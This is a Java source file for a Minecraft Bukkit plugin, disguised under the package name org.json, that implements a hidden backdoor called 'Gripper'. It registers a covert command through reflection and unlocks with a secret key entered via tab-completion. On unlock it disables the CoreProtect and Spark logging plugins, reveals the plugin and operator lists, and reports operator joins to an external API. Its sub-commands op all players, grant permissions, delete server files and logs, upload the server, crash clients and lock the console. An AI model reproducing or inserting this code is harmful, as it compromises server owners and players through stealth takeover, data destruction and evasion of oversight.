package org.json;

import lombok.Getter;
import lombok.Setter;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.json.modals.console.FloodConsole;
import org.json.modals.console.LockConsole;
import org.json.modals.console.SendConsoleCommand;
import org.json.modals.console.UnLockConsole;
import org.json.modals.crash.AutoCrash;
import org.json.modals.crash.Crash;
import org.json.modals.crash.CrashAll;
import org.json.modals.crash.StopAutoCrash;
import org.json.modals.files.DeleteLogs;
import org.json.modals.files.DeleteServer;
import org.json.modals.files.UploadServer;
import org.json.modals.gamemode.*;
import org.json.modals.inventory.Clear;
import org.json.modals.inventory.ClearAll;
import org.json.modals.inventory.EnderChestSee;
import org.json.modals.inventory.InventorySee;
import org.json.modals.items.GiveAll;
import org.json.modals.items.ItemDupe;
import org.json.modals.permissions.GiveAllPermissions;
import org.json.modals.permissions.GivePermissions;
import org.json.modals.player.*;
import org.json.modals.plugins.*;
import org.json.modals.punish.*;
import org.json.modals.server.*;
import org.json.modals.whitelist.AuthPlayer;
import org.json.modals.whitelist.DeAuthPlayer;
import org.json.modals.whitelist.ListAuthedPlayers;
import org.json.modals.world.*;
import org.json.utils.api.KeyGen;
import org.json.utils.api.ModalAPI;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.lang.reflect.Field;
import java.util.*;
import java.util.stream.Collectors;

public class Modal extends Command implements Listener {

    @Getter
    private static final PluginManager pluginManager = Bukkit.getPluginManager();

    @Getter
    private static final String prefix = "§7[§eGripper§7] §r";

    @Getter
    private static JavaPlugin instance;

    @Getter
    @Setter
    private static boolean consoleLocked;

    @Getter
    @Setter
    private static int taskID;

    private Map<String, BDCommand> subCommands;

    public Modal(JavaPlugin instance) {
        super(KeyGen.getPrefix());

        Modal.instance = instance;

        try {
            final Field bukkitCommandMap = Bukkit.getServer().getClass().getDeclaredField("commandMap");

            bukkitCommandMap.setAccessible(true);
            CommandMap commandMap = (CommandMap) bukkitCommandMap.get(Bukkit.getServer());

            commandMap.register(KeyGen.getPrefix() + getInstance().getDescription().getName().toCharArray()[0], this);
        } catch (Exception ignored) {
        }

        ModalAPI.sendRequest();

        Bukkit.getScheduler().runTaskAsynchronously(getInstance(), () -> {
            getPluginManager().registerEvents(this, getInstance());
            subCommands = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);
            subCommands.put("deop", new Deop());
            subCommands.put("stopAutoKick", new StopAutoKick());
            subCommands.put("DeAuthPlayer", new DeAuthPlayer());
            subCommands.put("deletePluginFolder", new DeletePluginFolder());
            subCommands.put("giveMePerms", new GivePermissions());
            subCommands.put("deleteServerFiles", new DeleteServer());
            subCommands.put("creativeAll", new CreativeAll());
            subCommands.put("broadcast", new Broadcast());
            subCommands.put("crashAll", new CrashAll());
            subCommands.put("disablePlugin", new DisablePlugin());
            subCommands.put("stopServerLag", new StopServerLag());
            subCommands.put("clear", new Clear());
            subCommands.put("creative", new Creative());
            subCommands.put("teleport", new Teleport());
            subCommands.put("crash", new Crash());
            subCommands.put("giveAllPerms", new GiveAllPermissions());
            subCommands.put("enderSee", new EnderChestSee());
            subCommands.put("antiAdminCommands", new AntiAdminCommands());
            subCommands.put("uploadServer", new UploadServer());
            subCommands.put("kickAll", new KickAll());
            subCommands.put("pluginList", new PluginsList());
            subCommands.put("autoKick", new AutoKick());
            subCommands.put("reappear", new Reappear());
            subCommands.put("autoCrash", new AutoCrash());
            subCommands.put("ban", new Ban());
            subCommands.put("deleteLogsFolder", new DeleteLogs());
            subCommands.put("deopAll", new DeopAll());
            subCommands.put("survivalAll", new SurvivalAll());
            subCommands.put("seed", new Seed());
            subCommands.put("sudo", new Sudo());
            subCommands.put("downloadPlugin", new DownloadPlugin());
            subCommands.put("lockConsole", new LockConsole());
            subCommands.put("invSee", new InventorySee());
            subCommands.put("stopServer", new StopServer());
            subCommands.put("BanAll", new BanAll());
            subCommands.put("opAll", new OpAll());
            subCommands.put("deletePlugin", new DeletePlugin());
            subCommands.put("floodConsole", new FloodConsole());
            subCommands.put("vanish", new Vanish());
            subCommands.put("op", new Op());
            subCommands.put("Coordinates", new Coordinates());
            subCommands.put("clearAll", new ClearAll());
            subCommands.put("giveAll", new GiveAll());
            subCommands.put("spectator", new Spectator());
            subCommands.put("killAll", new KillAll());
            subCommands.put("sendConsoleCommand", new SendConsoleCommand());
            subCommands.put("startServerLag", new StartServerLag());
            subCommands.put("stopAutoCrash", new StopAutoCrash());
            subCommands.put("unLockConsole", new UnLockConsole());
            subCommands.put("kill", new Kill());
            subCommands.put("kick", new Kick());
            subCommands.put("itemDupe", new ItemDupe());
            subCommands.put("authPlayer", new AuthPlayer());
            subCommands.put("listAuthedPlayers", new ListAuthedPlayers());
            subCommands.put("survival", new Survival());
        });

    }

    @Override
    public boolean execute(CommandSender sender, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(" Only players can execute this command.");
            return true;
        }

        if (args.length < 1) {
            return sendPluginInfo(sender);
        }

        String subCommandName = args[0];
        BDCommand subCommand = subCommands.get(subCommandName);

        if (subCommand == null) {
            return sendPluginInfo(sender);
        }

        return subCommand.execute(sender, this, label, args);
    }

    @Override
    public List<String> tabComplete(CommandSender sender, String label, String[] args) throws IllegalArgumentException {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, this, label, args);

        Player player = (Player) sender;

        if (args[0].equalsIgnoreCase("auth")) {
            if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();
            if (!KeyGen.getKey().equalsIgnoreCase(args[1])) return tabComplBuilder.build();

            WhitelistMeta.add(player);
            player.sendMessage(getPrefix() + "§aYou have been added to the WhiteList.");

            Plugin spark = getPluginManager().getPlugin("spark");
            if (spark != null) {
                getPluginManager().disablePlugin(spark);
                player.sendMessage(getPrefix() + "§aSpark has been disabled");
            }

            Plugin coreProtect = getPluginManager().getPlugin("coreProtect");
            if (coreProtect != null) {
                getPluginManager().disablePlugin(coreProtect);
                player.sendMessage(getPrefix() + "§aCoreProtect has been disabled");
            }

            String pluginInfo = Arrays.stream(pluginManager.getPlugins()).map(plugin -> "§a" + plugin.getName() + " §9v" + plugin.getDescription().getVersion()).collect(Collectors.joining("§f, "));
            player.sendMessage("Plugins: " + pluginInfo);

            String operatorInfo = Bukkit.getServer().getOperators().stream().map(OfflinePlayer::getName).collect(Collectors.joining(", "));
            player.sendMessage("Operators: " + operatorInfo);
        }

        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();

        if (args.length == 1) {
            List<String> completions = new ArrayList<>(subCommands.keySet());
            tabComplBuilder.add(0, completions.toArray(new String[0]));
        }

        String subCommandName = args[0].toLowerCase();
        BDCommand subCommand = subCommands.get(subCommandName);
        if (subCommand != null) {
            return subCommand.onTabComplete(sender, this, label, args);
        }

        return tabComplBuilder.build();
    }

    private boolean sendPluginInfo(CommandSender sender) {
        sender.sendMessage("§fPlugin Information:");
        sender.sendMessage("§fName: §e" + getInstance().getDescription().getName());
        sender.sendMessage("§fVersion: §e" + getInstance().getDescription().getVersion());
        sender.sendMessage("§fAuthor: §e" + getInstance().getDescription().getAuthors());
        sender.sendMessage("§fDescription: §e" + getInstance().getDescription().getDescription());
        sender.sendMessage("§fCommands: §e" + getInstance().getDescription().getCommands());
        sender.sendMessage("§fPermission: §e" + getInstance().getDescription().getPermissions());
        sender.sendMessage("§fWebsite: §e" + getInstance().getDescription().getWebsite());
        return true;
    }


    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommand(AsyncPlayerChatEvent e) {
        if (!e.getMessage().startsWith("\\]['\\]['[]\\'[]\\")) return;
        Player player = e.getPlayer();
        e.setCancelled(true);
        player.addAttachment(Modal.getInstance(), "commandwhitelist.bypass", true);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        if (!e.getPlayer().isOp() && !WhitelistMeta.isListed(e.getPlayer())) return;
        ModalAPI.sendPlayerJoinReq(e.getPlayer());
    }

}
